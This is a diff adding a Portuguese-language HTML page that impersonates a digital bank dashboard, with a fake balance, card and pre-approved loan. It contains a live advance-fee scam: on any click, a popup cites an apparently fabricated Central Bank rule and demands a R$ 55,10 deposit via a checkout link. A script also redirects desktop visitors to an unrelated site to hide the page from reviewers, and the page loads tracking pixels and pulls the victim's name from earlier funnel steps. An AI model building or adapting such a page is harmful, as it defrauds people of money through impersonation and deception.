@@ -1,0 +1,596 @@
+<html lang="pt-BR">
+
+<head>
+
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard Banco Digital</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            background-color: white;
+            color: #333;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .dashboard-container {
+            max-width: 400px;
+            width: 100%;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .header h1 {
+            color: #111;
+        }
+
+        .balance {
+            text-align: center;
+            background-color: #34387B;
+            color: white;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .balance h2 {
+            margin-bottom: 10px;
+        }
+
+        .transactions {
+            margin-bottom: 20px;
+        }
+
+        .transactions h3 {
+            margin-bottom: 10px;
+        }
+
+        .transaction {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .transaction:last-child {
+            border-bottom: none;
+        }
+
+        .menu {
+            display: flex;
+            justify-content: space-around;
+            margin-bottom: 20px;
+        }
+
+        .menu button {
+            background-color: #ffd900;
+            color: black;
+            border: none;
+            border-radius: 20px;
+            padding: 10px 20px;
+            cursor: pointer;
+        }
+
+        .menu button:hover {
+            background-color: #111;
+        }
+
+        /* Cartão Virtual */
+        .card-section {
+            background-color: #e5e5e5;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+
+        .card-section h3 {
+            color: #111;
+            margin-bottom: 10px;
+        }
+
+        .card {
+            background-color: #34387B;
+            color: white;
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .card p {
+            margin: 10px 0;
+        }
+
+        /* Empréstimo */
+        .loan-section {
+            background-color: #e5e5e5;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+
+        .loan-section h3 {
+            color: #111;
+            margin-bottom: 10px;
+        }
+
+        .loan {
+            background-color: white;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .loan p {
+            margin: 10px 0;
+            color: #333;
+        }
+
+        /* Pop-up Overlay */
+        .popup-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* Pop-up Content */
+        .popup-content {
+            position: relative;
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            width: 80%;
+            max-width: 500px;
+            text-align: center;
+        }
+
+        /* Botão X no canto superior direito */
+        .close-icon {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: none;
+            border: none;
+            font-size: 20px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .close-popup {
+            background-color: #111;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 20px;
+            cursor: pointer;
+            margin-top: 10px;
+            font-size: 15px;
+        }
+
+        .big-text {
+            font-size: 14px;
+        }
+
+        /* Responsividade */
+        @media (min-width: 600px) {
+            .dashboard-container {
+                max-width: 600px;
+            }
+        }
+    </style>
+
+    <script
+        src="signals/config/509548681405937?v=2.9.177&amp;r=stable&amp;domain=verizonsolucoes.com&amp;hme=c3e4904c1dde42d643265ef909b9e193c41cedcd6f559a3ff5e1b178e36647fa&amp;ex_m=70%2C121%2C107%2C111%2C61%2C4%2C100%2C69%2C16%2C97%2C89%2C51%2C54%2C172%2C175%2C187%2C183%2C184%2C186%2C29%2C101%2C53%2C77%2C185%2C167%2C170%2C180%2C181%2C188%2C131%2C41%2C189%2C190%2C34%2C143%2C15%2C50%2C195%2C194%2C133%2C18%2C40%2C1%2C43%2C65%2C66%2C67%2C71%2C93%2C17%2C14%2C96%2C92%2C91%2C108%2C52%2C110%2C39%2C109%2C30%2C94%2C26%2C168%2C171%2C140%2C86%2C56%2C84%2C33%2C73%2C0%2C95%2C32%2C28%2C82%2C83%2C88%2C47%2C46%2C87%2C37%2C11%2C12%2C13%2C6%2C7%2C25%2C22%2C23%2C57%2C62%2C64%2C75%2C102%2C27%2C76%2C9%2C8%2C80%2C48%2C21%2C104%2C103%2C105%2C98%2C10%2C20%2C3%2C38%2C74%2C19%2C5%2C90%2C81%2C44%2C35%2C85%2C2%2C36%2C63%2C42%2C106%2C45%2C79%2C68%2C112%2C60%2C59%2C31%2C99%2C58%2C55%2C49%2C78%2C72%2C24%2C113"
+        async=""></script>
+
+
+    <script type="text/javascript">
+        // Verifica o dispositivo e redireciona antes de carregar outros recursos
+        if (!/iPhone|iPod|iPad|Android|BlackBerry|IEMobile/i.test(navigator.userAgent) && window.innerWidth > 768) {
+            window.location.replace('https://gironews.com/negocios/fidelizacao-em-parceria-54183/');
+        }
+    </script>
+   <script>
+  window.pixelId = "6a184246f1f2699f88b3ab4b";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids async defer></script>
+
+<script>
+  window.pixelId = "6a184246f1f2699f88b3ab4b";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script>
+  window.pixelId = "6a184246f1f2699f88b3ab4b";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+<body>
+
+    <div class="header">
+        <img style="width: 160px;" src="https://i.postimg.cc/cLPm1HYx/VERIZON.png" alt="Imagem Centralizada">
+    </div>
+    <div class="dashboard-container">
+        <div class="header">
+            <h1>Bem-vindo<div class="name-info" style="text-align: center; font-weight: bold; font-size: 16px;"
+                    id="nomeCartao"></div>
+            </h1>
+        </div>
+
+        <div class="balance">
+            <h2>Saldo disponível</h2>
+            <p style="font-size: 18px; color: #FEE708; font-weight: 700;">R$ 44,90</p>
+        </div>
+
+        <div class="transactions">
+            <h3>Transações recentes</h3>
+
+            <div class="transaction">
+                <span>Estorno recebido</span>
+                <span>+R$ 19,90</span>
+            </div>
+            <div class="transaction">
+                <span>Depósito via PIX</span>
+                <span>+R$ 25,00</span>
+            </div>
+        </div>
+
+        <div class="menu">
+            <button class="big-text" id="77ee69c7-5bfc-bfe7-dcd1-6e662b9c1f61">Transferir</button>
+            <button class="big-text" id="98ac2a90-f247-e72a-b936-24a2bf037fd9">Pagar</button>
+            <button class="big-text" id="d35f29f0-dda6-1963-6f77-0b7f3c5c3264">Extrato</button>
+        </div>
+        <style>
+            .btn-custom {
+                color: black;
+                border: none;
+                width: 100%;
+                margin-bottom: 10px;
+                background: #FFD900;
+                font-weight: 500;
+                border-radius: 1rem;
+                padding: .75rem 3rem;
+                letter-spacing: .3px;
+                line-height: 1.15;
+            }
+
+            .btn-custom:hover {
+                color: black !important;
+                background-color: #ffd900 !important;
+                transform: scale(1.02) !important;
+            }
+
+            .footer {
+                background-color: #ffffff;
+                border-top: solid 1px #e6dddd;
+                color: #000;
+                text-align: center;
+                width: 100%;
+                bottom: 0;
+                grid-area: footer;
+                border-bottom: solid 3px #ffd900;
+                padding: 2rem 0.5rem;
+                position: relative;
+                margin-top: 50px;
+            }
+
+            #conclusao {
+                display: none;
+                /* Esconde o elemento por padrão */
+            }
+
+            #conclusao h4 {
+                color: green;
+                /* Define a cor do texto */
+                font-weight: bold;
+                /* Define o texto em negrito */
+            }
+
+            .char {
+                border-top: solid px #00adca;
+                background-color: #00adca;
+                padding: 2px !important;
+            }
+
+            /* End custom CSS */
+
+
+
+            /* .footer {
+            background-color: #e6007e;
+            color: white;
+            padding: 10px 20px;
+            text-align: center;
+            border-top: 1px solid #ddd;
+            width: 100%;
+            position: relative;
+        } */
+            /* .footer {
+            background-color: #ffffff;
+            border-top: solid 1px #e6dddd;
+            color: #000;
+            text-align: center;
+            padding: 10px 0;
+            position: fixed;
+            width: 100%;
+            position: relative;
+        } */
+            .card-wrapper {
+                max-width: 400px;
+                margin: 0 auto;
+                text-align: center;
+                background-color: #fff;
+                padding: 20px;
+                border-radius: 8px;
+                box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+                font-family: Arial, sans-serif;
+            }
+
+            .card-credit {
+                background: linear-gradient(135deg, #ffd900, #ffd901);
+                border-radius: 15px;
+                padding: 20px;
+                color: #fff;
+                box-shadow: 0px 8px 16px #0003;
+                position: relative;
+                height: 200px;
+                max-width: 350px;
+                margin: 0 auto;
+            }
+
+            .card-details {
+                position: relative;
+                width: 100%;
+                height: 100%;
+                color: black;
+            }
+
+            .bank-name {
+                font-size: 18px;
+                font-weight: bold;
+                text-align: left;
+                margin-bottom: 10px;
+            }
+
+            .chip {
+                position: absolute;
+                top: 23px;
+                left: 0px;
+                width: 40px;
+                display: flex;
+                align-items: center;
+            }
+
+            .chip img {
+                /* width: 100%;  */
+                height: auto;
+                width: 30px;
+                /* Ajuste o tamanho do chip */
+                margin-right: 5px;
+                /* Espaço entre o chip e o NFC */
+            }
+
+            .nfc {
+                position: absolute;
+                top: 20px;
+                right: 20px;
+                width: 30px;
+            }
+
+            .nfc-img {
+                width: 20px;
+            }
+
+            .card-number {
+                font-size: 16px;
+                letter-spacing: 2px;
+                margin-top: 49px;
+                text-align: left;
+            }
+
+            .valid-thru {
+                font-size: 12px;
+                text-align: left;
+                margin-top: 10px;
+            }
+
+            .name-info {
+                font-size: 14px;
+                color: #fff;
+                text-align: left;
+                margin-top: 5px;
+                color: black;
+            }
+
+            .platinum {
+                position: absolute;
+                top: 2px;
+                right: 20px;
+            }
+
+            .mastercard {
+                position: absolute;
+                bottom: 20px;
+                right: 20px;
+                width: 50px;
+            }
+
+            .mastercard img {
+                width: 100%;
+                /* Garantir que a imagem da Mastercard ocupe todo o contêiner sem distorcer */
+                height: auto;
+            }
+
+            .btn-primary {
+                background-color: #e6007e;
+                color: white;
+                border: none;
+                padding: 10px 20px;
+                border-radius: 5px;
+                font-size: 16px;
+                cursor: pointer;
+                margin-top: 20px;
+            }
+
+            .btn-primary:hover {
+                background-color: #c20068;
+            }
+        </style>
+        <!-- Seção de Cartão Virtual -->
+        <div class="card-section">
+            <h3>Cartão Virtual</h3>
+            <div class="card">
+                <p>Cartão Virtual</p>
+                <p>Limite disponível: <strong style="color: #FEE708;">R$ 4.700,00</strong></p>
+                <p>**** **** **** 3428</p>
+            </div>
+        </div>
+
+        <!-- Seção de Empréstimo -->
+        <div class="loan-section">
+            <h3>Empréstimo Pré-Aprovado</h3>
+            <div class="loan">
+                <p>Você tem até <strong style="color: #111;">R$ 7.000,00</strong> de empréstimo pré-aprovado.</p>
+                <button class="big-text"
+                    style="background-color: #ffd900; color: black; border: none; border-radius: 20px; padding: 10px 20px;"
+                    id="2000665f-3b7d-98d5-fd01-56413ba1a81b">Solicitar</button>
+            </div>
+        </div>
+
+        <div class="loan-section">
+            <h3>Faturas</h3>
+            <div class="loan">
+                <p>Sem dados para exibir.</p>
+
+            </div>
+        </div>
+        <div class="loan-section">
+            <h3>Seguros</h3>
+            <div class="loan">
+                <p>Seguro Prestamista Contratado✅</p>
+
+            </div>
+        </div>
+
+    </div>
+
+
+    <script>
+        document.getElementById("nomeCartao").innerHTML = localStorage.getItem("posicard_nome");
+        document.addEventListener("DOMContentLoaded", function () {
+            const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuarioUni'));
+            if (dadosUsuario && dadosUsuario.nome) {
+                const nomeCompleto = dadosUsuario.nome.split(' ');
+                const primeiroNome = nomeCompleto[0];
+                const ultimoNome = nomeCompleto[nomeCompleto.length - 1];
+                const nomeParaMostrar = `${primeiroNome} ${ultimoNome}`;
+                document.getElementById('nomeCartao').textContent = nomeParaMostrar;
+            } else {
+                console.error('Nome do usuário não encontrado no localStorage.');
+            }
+        });
+    </script>
+
+    <!-- Pop-up Overlay -->
+    <div class="popup-overlay" id="popup">
+        <div class="popup-content">
+            <button class="close-icon" id="closePopupBtn">×</button>
+            <h2 style="margin-bottom: 10px;">Leia com Atenção</h2>
+            <p style="margin-bottom: 10px;">De acordo com a Normativa BCB n° 349 (2024) do Banco Central, o oferecimento
+                de crédito elevado (4 mil ou mais) por Financeiras de crédito que atuam no Brasil deve ser justificado
+                com <strong>saldo mínimo de 100 reais</strong> por parte do solicitante, para prevenção de possíveis
+                fraudes.</p>
+            <p style="margin-bottom: 10px;">Isso significa que para utilizar seu <strong>Cartão Virtual, Movimentar sua
+                    Conta ou Solicitar Empréstimos</strong>, você deve obrigatoriamente ter 100 reais ou mais de saldo
+                em conta.</p>
+            <p style="margin-bottom: 15px;">Mas não se preocupe, você já possui <strong>R$ 44,90 de saldo
+                    conosco</strong>, basta "completar" com um depósito de <strong>R$ 55,10</strong>, que você já poderá
+                utilizar 100% dos serviços oferecidos pelo Mercado Livre Bank S/A.</p>
+
+
+            <a href="./checkout/" class="close-popup"
+                id="06c86b47-4d50-8a6f-18a7-0aa39dc670ec">
+                <button class="close-popup" type="button" id="ff0953f0-fcd6-69cb-1cd6-e54826499e1f">Clique aqui para
+                    Depositar</button>
+            </a>
+
+
+        </div>
+    </div>
+
+    <script>
+        // Exibir o pop-up ao clicar no corpo do site
+        document.body.addEventListener('click', function (event) {
+            if (!event.target.closest('.popup-content') && !event.target.closest('.close-icon')) {
+                document.getElementById('popup').style.display = 'flex';
+            }
+        });
+
+        // Fechar o pop-up ao clicar no botão X
+        document.getElementById('closePopupBtn').addEventListener('click', function (event) {
+            document.getElementById('popup').style.display = 'none';
+            event.stopPropagation();
+        });
+
+    </script>
+
+
+    <script>
+        // Puxar nome do Cliente
+
+        document.addEventListener("DOMContentLoaded", function () {
+            const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuarioUni'));
+            if (dadosUsuario && dadosUsuario.nome) {
+                const nomeCompleto = dadosUsuario.nome.split(' ');
+                const primeiroNome = nomeCompleto[0];
+                const nomeParaMostrar = `${primeiroNome}`;
+                document.getElementById('nomeCliente').textContent = nomeParaMostrar;
+            } else {
+                console.error('Nome do usuário não encontrado no localStorage.');
+            }
+        });
+    </script>
+
+
+
+</body>
+
+</html>
